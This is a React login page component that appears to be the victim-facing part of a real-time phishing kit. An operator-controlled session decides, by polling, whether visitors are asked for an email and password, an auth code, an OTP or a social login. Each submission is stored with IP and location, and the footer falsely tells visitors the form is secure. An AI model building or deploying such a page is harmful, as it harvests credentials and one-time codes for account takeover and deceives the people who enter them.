
import React, { useEffect, useState } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { useSessionContext } from '@/contexts/SessionContext';

const LoginPage = () => {
  const { sessionId } = useParams<{ sessionId: string }>();
  const { getSessionById, addSessionData } = useSessionContext();
  const [formData, setFormData] = useState<Record<string, string>>({});
  const [session, setSession] = useState<ReturnType<typeof getSessionById>>();
  const [submitted, setSubmitted] = useState(false);
  const [error, setError] = useState('');
  const navigate = useNavigate();

  useEffect(() => {
    if (!sessionId) {
      setError('Invalid session ID');
      return;
    }
    
    const sessionData = getSessionById(sessionId);
    if (!sessionData) {
      setError('Session not found');
      return;
    }
    
    setSession(sessionData);
    
    // Setup polling to check for page type changes
    const intervalId = setInterval(() => {
      const updatedSession = getSessionById(sessionId);
      if (updatedSession && updatedSession.pageType !== session?.pageType) {
        setSession(updatedSession);
      }
    }, 2000);
    
    return () => clearInterval(intervalId);
  }, [sessionId, getSessionById, session?.pageType]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!sessionId || !session) {
      setError('Session not available');
      return;
    }
    
    try {
      // Mock geolocation data (in a real app, you'd get this from a service)
      const mockLocation = 'New York, USA';
      const mockIp = '192.168.1.' + Math.floor(Math.random() * 255);
      
      addSessionData(sessionId, {
        timestamp: new Date().toISOString(),
        ip: mockIp,
        location: mockLocation,
        formData
      });
      
      setSubmitted(true);
      
      // Reset form after submission
      setFormData({});
    } catch (err) {
      setError('Failed to submit data');
      console.error(err);
    }
  };

  if (error) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <Card className="w-full max-w-md">
          <CardHeader>
            <CardTitle className="text-center">Error</CardTitle>
          </CardHeader>
          <CardContent>
            <Alert variant="destructive">
              <AlertTitle>Something went wrong</AlertTitle>
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          </CardContent>
          <CardFooter>
            <Button className="w-full" onClick={() => navigate('/')}>
              Go to Homepage
            </Button>
          </CardFooter>
        </Card>
      </div>
    );
  }

  if (submitted) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <Card className="w-full max-w-md">
          <CardHeader>
            <CardTitle className="text-center">Success!</CardTitle>
          </CardHeader>
          <CardContent>
            <Alert>
              <AlertTitle>Submission Received</AlertTitle>
              <AlertDescription>
                Your information has been successfully submitted. Thank you!
              </AlertDescription>
            </Alert>
          </CardContent>
          <CardFooter>
            <Button className="w-full" onClick={() => setSubmitted(false)}>
              Submit Another Response
            </Button>
          </CardFooter>
        </Card>
      </div>
    );
  }

  if (!session) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <Card className="w-full max-w-md animate-pulse">
          <CardHeader>
            <div className="h-7 bg-muted rounded-md mb-2"></div>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="h-10 bg-muted rounded-md"></div>
            <div className="h-10 bg-muted rounded-md"></div>
            <div className="h-10 bg-muted rounded-md"></div>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4">
      <Card className="w-full max-w-md">
        <CardHeader>
          <CardTitle className="text-center">
            {session.pageType === 'login1' && "Sign In"}
            {session.pageType === 'login2' && "Enter Auth Code"}
            {session.pageType === 'login3' && "OTP Verification"}
            {session.pageType === 'login4' && "Sign In with Social Media"}
          </CardTitle>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleSubmit}>
            {session.pageType === 'login1' && (
              <>
                <div className="grid gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="email">Email</Label>
                    <Input 
                      id="email" 
                      name="email" 
                      type="email" 
                      placeholder="name@example.com" 
                      required
                      value={formData.email || ''}
                      onChange={handleInputChange}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="password">Password</Label>
                    <Input 
                      id="password" 
                      name="password" 
                      type="password" 
                      required
                      value={formData.password || ''}
                      onChange={handleInputChange}
                    />
                  </div>
                  <Button type="submit" className="w-full">Sign In</Button>
                </div>
              </>
            )}
            
            {session.pageType === 'login2' && (
              <>
                <div className="grid gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="auth_code">Authentication Code</Label>
                    <Input 
                      id="auth_code" 
                      name="auth_code" 
                      placeholder="Enter your auth code" 
                      required
                      value={formData.auth_code || ''}
                      onChange={handleInputChange}
                    />
                  </div>
                  <Button type="submit" className="w-full">Verify</Button>
                </div>
              </>
            )}
            
            {session.pageType === 'login3' && (
              <>
                <div className="grid gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="otp">One-Time Password</Label>
                    <Input 
                      id="otp" 
                      name="otp" 
                      placeholder="Enter the OTP sent to your device" 
                      required
                      value={formData.otp || ''}
                      onChange={handleInputChange}
                    />
                  </div>
                  <Button type="submit" className="w-full">Verify OTP</Button>
                </div>
              </>
            )}
            
            {session.pageType === 'login4' && (
              <>
                <div className="grid gap-4">
                  <Button 
                    type="button" 
                    className="w-full bg-[#1877f2] hover:bg-[#0c63d4]"
                    onClick={() => {
                      setFormData({ provider: 'facebook' });
                      handleSubmit(new Event('submit') as unknown as React.FormEvent);
                    }}
                  >
                    Continue with Facebook
                  </Button>
                  <Button 
                    type="button" 
                    className="w-full bg-[#1da1f2] hover:bg-[#0c85d0]"
                    onClick={() => {
                      setFormData({ provider: 'twitter' });
                      handleSubmit(new Event('submit') as unknown as React.FormEvent);
                    }}
                  >
                    Continue with Twitter
                  </Button>
                  <Button 
                    type="button" 
                    className="w-full bg-[#db4437] hover:bg-[#c53727]"
                    onClick={() => {
                      setFormData({ provider: 'google' });
                      handleSubmit(new Event('submit') as unknown as React.FormEvent);
                    }}
                  >
                    Continue with Google
                  </Button>
                </div>
              </>
            )}
          </form>
        </CardContent>
        <CardFooter className="justify-center">
          <p className="text-sm text-muted-foreground">
            This is a secure form. Your information is protected.
          </p>
        </CardFooter>
      </Card>
    </div>
  );
};

export default LoginPage;
